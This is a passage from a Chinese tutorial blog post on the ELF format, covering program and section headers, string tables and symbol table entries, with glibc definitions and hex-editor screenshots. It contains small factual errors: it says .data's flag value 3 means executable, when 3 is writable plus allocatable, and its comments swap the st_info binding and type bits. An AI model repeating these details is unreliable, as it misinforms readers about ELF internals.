0x6ffffffa</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_SUNWBSS	0x6ffffffa	<span class="comment">/* Sun Specific segment */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_SUNWSTACK	0x6ffffffb	<span class="comment">/* Stack segment */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_HISUNW	0x6fffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_HIOS		0x6fffffff	<span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOPROC	0x70000000	<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_HIPROC	0x7fffffff	<span class="comment">/* End of processor-specific */</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>PT_NULL(0)</code>表明该段未使用,对应程序头表项其他成员均没有定义</p>
</blockquote>
<h4 id="p_flags">p_flags</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for p_flags (segment flags).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_X		(1 &lt;&lt; 0)	<span class="comment">/* Segment is executable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_W		(1 &lt;&lt; 1)	<span class="comment">/* Segment is writable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_R		(1 &lt;&lt; 2)	<span class="comment">/* Segment is readable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MASKOS	0x0ff00000	<span class="comment">/* OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MASKPROC	0xf0000000	<span class="comment">/* Processor-specific */</span></span></span><br></pre></td></tr></table></figure>
<p>段权限,主要是RWX属性</p>
<p>比如使用最简单的gcc命令编译成的main栈段的权限:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806083553366.png"
alt="image-20220806083553366" />
<figcaption aria-hidden="true">image-20220806083553366</figcaption>
</figure>
<p>此时栈是没有执行权限</p>
<p>如果编译时禁用NX保护<code>gcc -z execstack main.c -o main</code>,此时栈就可以读写执行了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806084047470.png"
alt="image-20220806084047470" />
<figcaption aria-hidden="true">image-20220806084047470</figcaption>
</figure>
<blockquote>
<p>默认情况下是开启NX保护的</p>
<p><code>gcc -z execstack</code> 关闭NX保护</p>
<p><code>gcc -z noexecstack</code>开启NX保护</p>
</blockquote>
<h4 id="p_offset">p_offset</h4>
<p>文件偏移量,如果该段是程序运行时才会建立,比如堆栈,则该值为0</p>
<h4 id="p_vaddr">p_vaddr</h4>
<p>相对虚拟地址</p>
<h4 id="p_paddr">p_paddr</h4>
<p>物理地址,该值只在直接使用物理内存的机器和系统上使用</p>
<h4 id="p_filesz">p_filesz</h4>
<p>文件中该段的大小</p>
<h4 id="p_memsz">p_memsz</h4>
<p>内存镜像中该段的大小</p>
<h4 id="p_align">p_align</h4>
<p>该段的对齐要求</p>
<p>该值为0或者1表示不用对齐,否则按照2的幂次对齐</p>
<p>要求<code>p_vaddr</code>和<code>p_offset</code>模<code>p_align</code>要相等</p>
<h3 id="节头表">节头表</h3>
<p>main中节头表有30项</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806084931736.png" /></p>
<p>每一项都是<code>Elf64_Shdr</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word	sh_type;		<span class="comment">/* Section type */</span></span><br><span class="line">  Elf64_Xword	sh_flags;		<span class="comment">/* Section flags */</span></span><br><span class="line">  Elf64_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off	sh_offset;		<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf64_Xword	sh_size;		<span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf64_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword	sh_addralign;		<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf64_Xword	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<h4 id="sh_name">sh_name</h4>
<p>这里name不是直接的ASCII码表示的字符串,而是.shstrtab这个节中的偏移</p>
<blockquote>
<p>一个<code>Elf64_Word</code>即<code>uint_32</code>,就四个字节,但是节名显然可以更长,比如<code>.got.plt</code></p>
</blockquote>
<p>比如.data节节名的下标就是FCh</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806085921448.png"
alt="image-20220806085921448" />
<figcaption aria-hidden="true">image-20220806085921448</figcaption>
</figure>
<p>到shstrtab的节头看看</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806090138926.png"
alt="image-20220806090138926" />
<figcaption aria-hidden="true">image-20220806090138926</figcaption>
</figure>
<p>发现该节在文件中的偏移量为35ED,到该节中看看</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806090231225.png"
alt="image-20220806090231225" />
<figcaption aria-hidden="true">image-20220806090231225</figcaption>
</figure>
<p>该位置正是所有节名字符串的起点,所有的节名都是一块存放的,均以NULL结尾.那么划分节名的时候就是从本节区初,预见NULL则划分一个字符串作为一个节名</p>
<p>可以发现节区初<code>0x35ED</code>就有一个NULL,这对应一个无名的节区(SHN_UNDEF)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806090713731.png"
alt="image-20220806090713731" />
<figcaption aria-hidden="true">image-20220806090713731</figcaption>
</figure>
<p>35ED+FC=36E9</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806090419728.png"
alt="image-20220806090419728" />
<figcaption aria-hidden="true">image-20220806090419728</figcaption>
</figure>
<p>这个位置正是".data"字符串的起始位置</p>
<h4 id="sh_type">sh_type</h4>
<p>节类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for sh_type (section type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_NULL	  0		<span class="comment">/* Section header table entry unused */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_PROGBITS	  1		<span class="comment">/* Program data */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_SYMTAB	  2		<span class="comment">/* Symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_STRTAB	  3		<span class="comment">/* String table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_RELA	  4		<span class="comment">/* Relocation entries with addends */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_HASH	  5		<span class="comment">/* Symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_DYNAMIC	  6		<span class="comment">/* Dynamic linking information */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_NOTE	  7		<span class="comment">/* Notes */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_NOBITS	  8		<span class="comment">/* Program space with no data (bss) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_REL		  9		<span class="comment">/* Relocation entries, no addends */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_SHLIB	  10		<span class="comment">/* Reserved */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_DYNSYM	  11		<span class="comment">/* Dynamic linker symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_INIT_ARRAY	  14		<span class="comment">/* Array of constructors */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_FINI_ARRAY	  15		<span class="comment">/* Array of destructors */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_PREINIT_ARRAY 16		<span class="comment">/* Array of pre-constructors */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GROUP	  17		<span class="comment">/* Section group */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_SYMTAB_SHNDX  18		<span class="comment">/* Extended section indices */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	SHT_NUM		  19		<span class="comment">/* Number of defined types.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_LOOS	  0x60000000	<span class="comment">/* Start OS-specific.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GNU_ATTRIBUTES 0x6ffffff5	<span class="comment">/* Object attributes.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GNU_HASH	  0x6ffffff6	<span class="comment">/* GNU-style hash table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GNU_LIBLIST	  0x6ffffff7	<span class="comment">/* Prelink library list */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_CHECKSUM	  0x6ffffff8	<span class="comment">/* Checksum for DSO content.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_LOSUNW	  0x6ffffffa	<span class="comment">/* Sun-specific low bound.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_SUNW_move	  0x6ffffffa</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_SUNW_COMDAT   0x6ffffffb</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_SUNW_syminfo  0x6ffffffc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GNU_verdef	  0x6ffffffd	<span class="comment">/* Version definition section.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GNU_verneed	  0x6ffffffe	<span class="comment">/* Version needs section.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_GNU_versym	  0x6fffffff	<span class="comment">/* Version symbol table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_HISUNW	  0x6fffffff	<span class="comment">/* Sun-specific high bound.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_HIOS	  0x6fffffff	<span class="comment">/* End OS-specific type */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_LOPROC	  0x70000000	<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_HIPROC	  0x7fffffff	<span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_LOUSER	  0x80000000	<span class="comment">/* Start of application-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_HIUSER	  0x8fffffff	<span class="comment">/* End of application-specific */</span></span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806090940795.png"
alt="image-20220806090940795" />
<figcaption aria-hidden="true">image-20220806090940795</figcaption>
</figure>
<p>data节的类型为<code>SHT_PROGBITS(1)</code>,意思是程序数据</p>
<p>bss节的类型是<code>SHT_NOBITS(8)</code>,专门给bss节设置的节类型</p>
<h4 id="sh_flags">sh_flags</h4>
<p>节标志位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for sh_flags (section flags).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_WRITE	     (1 &lt;&lt; 0)	<span class="comment">/* Writable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_ALLOC	     (1 &lt;&lt; 1)	<span class="comment">/* Occupies memory during execution */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_EXECINSTR	     (1 &lt;&lt; 2)	<span class="comment">/* Executable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_MERGE	     (1 &lt;&lt; 4)	<span class="comment">/* Might be merged */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_STRINGS	     (1 &lt;&lt; 5)	<span class="comment">/* Contains nul-terminated strings */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_INFO_LINK	     (1 &lt;&lt; 6)	<span class="comment">/* `sh_info&#x27; contains SHT index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_LINK_ORDER	     (1 &lt;&lt; 7)	<span class="comment">/* Preserve order after combining */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_OS_NONCONFORMING (1 &lt;&lt; 8)	<span class="comment">/* Non-standard OS specific handling</span></span></span><br><span class="line"><span class="comment"><span class="meta">					   required */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_GROUP	     (1 &lt;&lt; 9)	<span class="comment">/* Section is member of a group.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_TLS		     (1 &lt;&lt; 10)	<span class="comment">/* Section hold thread-local data.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_COMPRESSED	     (1 &lt;&lt; 11)	<span class="comment">/* Section with compressed data. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_MASKOS	     0x0ff00000	<span class="comment">/* OS-specific.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_MASKPROC	     0xf0000000	<span class="comment">/* Processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_GNU_RETAIN	     (1 &lt;&lt; 21)  <span class="comment">/* Not to be GCed by linker.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_ORDERED	     (1 &lt;&lt; 30)	<span class="comment">/* Special ordering requirement</span></span></span><br><span class="line"><span class="comment"><span class="meta">					   (Solaris).  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_EXCLUDE	     (1U &lt;&lt; 31)	<span class="comment">/* Section is excluded unless</span></span></span><br><span class="line"><span class="comment"><span class="meta">					   referenced or allocated (Solaris).*/</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>SHF_WRITE:该节在进程虚拟空间中可写</p>
<p>SHF_ALLOC:该节在进程虚拟内存中需要分配空间,比如text,data,bss节</p>
<p>SHF_EXECINSTR:该节在进程虚拟空间中可执行,比如text</p>
</blockquote>
<p>都是2的幂次,多个属性按位或</p>
<p>.data节的标志是3,意味着可以分配,可以执行</p>
<h4 id="sh_addr">sh_addr</h4>
<p>节虚拟地址,如果该节会被加载,则该值为节在虚拟内存中的地址</p>
<h4 id="sh_offset">sh_offset</h4>
<p>节文件偏移,不是本节头的文件偏移,而是本节头指向对应的节的偏移量</p>
<p>为啥要节和节头分家?</p>
<p>每个节的大小固定,如果有额外信息,比如shrstrtab需要额外保存字符数组,则用该成员作为指针另外指向一片区域</p>
<p>这样加载时读取节头不用担心有大有小,直接读取整个节头表即可</p>
<h4 id="sh_size">sh_size</h4>
<p>节区大小,不是节头大小,而是节头指向的对应节区的大小</p>
<h4 id="sh_linksh_info">sh_link&amp;sh_info</h4>
<p>节链接信息,这两个成员的意义视sh_type而定</p>
<blockquote>
<p>来自CTF wiki:</p>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 56%" />
<col style="width: 24%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">sh_type</th>
<th style="text-align: left;">sh_link</th>
<th style="text-align: left;">sh_info</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">SHT_DYNAMIC</td>
<td style="text-align: left;">节区中使用的字符串表的节头索引</td>
<td style="text-align: left;">0</td>
</tr>
<tr>
<td style="text-align: left;">SHT_HASH</td>
<td style="text-align: left;">此哈希表所使用的符号表的节头索引</td>
<td style="text-align: left;">0</td>
</tr>
<tr>
<td style="text-align: left;">SHT_REL/SHT_RELA</td>
<td style="text-align: left;">与符号表相关的节头索引</td>
<td style="text-align: left;">重定位应用到的节的节头索引</td>
</tr>
<tr>
<td style="text-align: left;">SHT_SYMTAB/SHT_DYNSYM</td>
<td style="text-align: left;">操作系统特定信息，Linux 中的 ELF
文件中该项指向符号表中符号所对应的字符串节区在 Section Header Table
中的偏移。</td>
<td style="text-align: left;">操作系统特定信息</td>
</tr>
<tr>
<td style="text-align: left;">other</td>
<td style="text-align: left;"><code>SHN_UNDEF</code></td>
<td style="text-align: left;">0</td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="sh_addralign">sh_addralign</h4>
<p>节虚拟地址对齐要求</p>
<h4 id="sh_entsize">sh_entsize</h4>
<p>如果本节也是一个数组,则本项目表征的是数组元素大小</p>
<p>比如got表</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806092014449.png"
alt="image-20220806092014449" />
<figcaption aria-hidden="true">image-20220806092014449</figcaption>
</figure>
<p>其表项就是一个动态库中的实际虚拟地址,在64位系统上,8字节即可寻址整个虚拟地址空间,因此got节头中该值为8</p>
<h3 id="节区">节区</h3>
<p>程序员的自我修养P77给了一张SimpleSection.o的文件视图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806094931783.png"
alt="image-20220806094931783" />
<figcaption aria-hidden="true">image-20220806094931783</figcaption>
</figure>
<p>越看越不对劲,最后发现不对劲是因为,.o文件不需要程序头表也就罢了,节头表section
Table为啥没有紧挨着ELF头?而是夹在一些节区中间?</p>
<p>ELF头后面紧跟着的是text节</p>
<p>推测,Section Table后面的是链接需要用到的节,前面链接用不到</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806095428497.png"
alt="image-20220806095428497" />
<figcaption aria-hidden="true">image-20220806095428497</figcaption>
</figure>
<p>010editor将符号表和动态符号表与节区头表,程序头表,elf头并列分析了</p>
<p>而实际上symbol_table和dynamic_symbol_table都是节区,只不过这两个节区都是表</p>
<h4 id="字符串表">字符串表</h4>
<p>对应节头是这样的:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806100917610.png"
alt="image-20220806100917610" />
<figcaption aria-hidden="true">image-20220806100917610</figcaption>
</figure>
<p>s_offset表明字符串表的文件偏移为0x33F0</p>
<p>s_size表明字符串表的大小是509字节</p>
<p>那么字符串表在文件中的位置就是<code>[33F0h,35F9h]</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806101143997.png"
alt="image-20220806101143997" />
<figcaption aria-hidden="true">image-20220806101143997</figcaption>
</figure>
<p>其中的字符串均以NULL结尾,那么需要引用其中的字符串时,只需要给出相应字符串在字符串表中的下标或者偏移量,不需要再给出长度或者结尾的偏移</p>
<p>找到NULL就意味着字符串结束</p>
<h4 id="节名字符串表">节名字符串表</h4>
<p>作用类似于字符串表,都是字符数组,只不过节名字符串表专门存放节名字符串</p>
<p>本节对应节头是这样写的:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806101528306.png"
alt="image-20220806101528306" />
<figcaption aria-hidden="true">image-20220806101528306</figcaption>
</figure>
<p>最下面这个<code>char data[272]</code>是010editor故意把节直接放到这里观察了,就是节名字符串表</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806101712880.png"
alt="image-20220806101712880" />
<figcaption aria-hidden="true">image-20220806101712880</figcaption>
</figure>
<p>各个节头中的<code>Elf32_Shdr.sh_name</code>成员,就是本表中的字符串偏移量</p>
<h4 id="符号表">符号表</h4>
<p>符号:函数和变量统称符号</p>
<p>为了更清晰地观察符号表写一个<code>test.c</code>并编译成可重定位目标模块</p>
<p><code>test.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> global_initialized=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> global_uninitialized;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> static_initialized=<span class="number">20</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> static_uninitialized;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> local;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d,%d,%d&quot;</span>,global_initialized,global_uninitialized,static_initialized,static_uninitialized,local);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -O0 -c -o test.o</span><br></pre></td></tr></table></figure>
<p>符号表对应的节头是这样写的:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806103614207.png"
alt="image-20220806103614207" />
<figcaption aria-hidden="true">image-20220806103614207</figcaption>
</figure>
<p>s_offset表明符号表的基地址在文件中的F8h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806103655607.png"
alt="image-20220806103655607" />
<figcaption aria-hidden="true">image-20220806103655607</figcaption>
</figure>
<p>确实是一个表,有12项,其中就包括<code>static_initialized</code>等全局或者静态变量,<code>main</code>,<code>printf</code>等函数名</p>
<p>每个表项的结构相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意64位和32位的结构体成员顺序不一样</p>
</blockquote>
<h5 id="st_name">st_name</h5>
<p>本符号名字符串在strtab字符串表中的偏移量</p>
<p>比如<code>static_initialized</code>这一项中,该值为8h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806103940309.png"
alt="image-20220806103940309" />
<figcaption aria-hidden="true">image-20220806103940309</figcaption>
</figure>
<p>去查strtab表,对应strtab表头的sh_offset表明strtab表在0x218,那么<code>static_initialized</code>字符串就应该是从0x220开始一直到NULL结尾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806104112403.png"
alt="image-20220806104112403" />
<figcaption aria-hidden="true">image-20220806104112403</figcaption>
</figure>
<p>确实如此</p>
<h5 id="st_info">st_info</h5>
<p>符号类型和绑定信息</p>
<p>st_info为unsigned
char类型,8位,高四位和低四位分别表示符号绑定信息和符号类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//低四位表示符号类型</span></span><br><span class="line"><span class="comment">/* Legal values for ST_BIND subfield of st_info (symbol binding).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STB_LOCAL	0		<span class="comment">/* Local symbol,局部符号 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STB_GLOBAL	1		<span class="comment">/* Global symbol,全局符号 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STB_WEAK	2		<span class="comment">/* Weak symbol,弱引用 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	STB_NUM		3		<span class="comment">/* Number of defined types.  一共就三种符号,0,1,2*/</span></span></span><br><span class="line"><span class="comment">//STB_NUM表明一共就三种符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//高四位表示符号绑定信息</span></span><br><span class="line"><span class="comment">/* Legal values for ST_TYPE subfield of st_info (symbol type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_NOTYPE	0		<span class="comment">/* Symbol type is unspecified ,未知类型符号*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_OBJECT	1		<span class="comment">/* Symbol is a data object ,数据对象,数组,变量,对象*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_FUNC	2		<span class="comment">/* Symbol is a code object ,函数*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_SECTION	3		<span class="comment">/* Symbol associated with a section ,节*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_FILE	4		<span class="comment">/* Symbol&#x27;s name is file name ,文件名*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_COMMON	5		<span class="comment">/* Symbol is a common data object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STT_TLS		6		<span class="comment">/* Symbol is thread-local data object*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	STT_NUM		7		<span class="comment">/* Number of defined types.  */</span></span></span><br><span class="line"><span 